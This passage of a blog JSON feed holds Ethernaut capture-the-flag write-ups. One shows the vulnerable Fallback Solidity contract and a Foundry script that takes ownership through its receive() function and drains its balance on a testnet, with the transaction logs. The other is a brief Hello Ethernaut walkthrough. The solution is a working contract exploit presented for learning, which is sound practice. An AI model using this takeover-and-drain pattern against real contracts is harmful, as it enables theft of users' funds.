class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>script/FallbackSol.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallback.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallback</span> <span class=\"k\">public</span> <span class=\"n\">fallback_</span> <span class=\"o\">=</span> <span class=\"n\">Fallback</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x0662008C4CEE1F808C3ca3800404a2BA704952eD</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">contribute</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My contribution: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">getContribution</span><span class=\"p\">());</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">fallback_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">();</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FallbackSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used <span class=\"k\">for </span>script: 147280Estimated amount required: 0.00000028924952504 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH <span class=\"o\">(</span>28302 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH <span class=\"o\">(</span>47965 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH <span class=\"o\">(</span>30364 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallback",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            "title": "[Ethernaut] 00.Hello Ethernaut",
            "summary": null,
            "content_text": "Look into the level‚Äôs info method contract.info()  or¬†await contract.info()¬† if you‚Äôre using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.after transaction called, clik the ‚ÄúSubmit Instance‚Äù button",
            "content_html": "<p>Look into the level‚Äôs info method <code class=\"language-plaintext highlighter-rouge\">contract.info()</code>  or¬†<code class=\"language-plaintext highlighter-rouge\">await contract.info()</code>¬† if you‚Äôre using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info().png\" alt=\"Image await contract.info()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info1().png\" alt=\"Image await contract.info1()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info2().png\" alt=\"Image await contract.info2()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_infoNum().png\" alt=\"Image await contract.infoNum()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info42().png\" alt=\"Image await contract.info42()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_theMethodName().png\" alt=\"Image await contract.theMethodName()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_method7123949().png\" alt=\"Image await contract.method7123949()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_authenticate().png\" alt=\"Image await contract.authenticate()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/mm.png\" alt=\"Image Metamask\" /></p><p>after transaction called, clik the ‚ÄúSubmit Instance‚Äù button</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            
            
            
            "tags": ["blockchain","ethernaut"],
            
            "date_published": "2025-04-16T00:00:00+09:00",
            "date_modified": "2025-04-16T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}